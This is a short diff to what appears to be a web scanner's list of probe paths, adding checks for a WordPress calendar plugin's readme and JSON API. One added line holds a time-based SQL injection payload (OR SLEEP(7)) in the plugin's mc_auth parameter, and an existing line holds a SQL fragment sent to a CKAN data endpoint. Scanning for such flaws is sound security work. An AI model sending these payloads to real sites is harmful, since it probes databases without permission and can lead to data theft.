@@ -57,3 +57,6 @@
 /api/action/status_show
 /api/action/datastore_search_sql?sql=SELECT+ts_rewrite(
 /wp-content/themes/xstore/style.css
+/wp-content/plugins/my-calendar/readme.txt
+/?to=2026-09-12&from=2026-08-13&mc-api=json
+/?to=2026-09-12&from=2026-08-13&mc-api=json&mc_auth=1%2C2)%20OR%20SLEEP%287%29--%20x
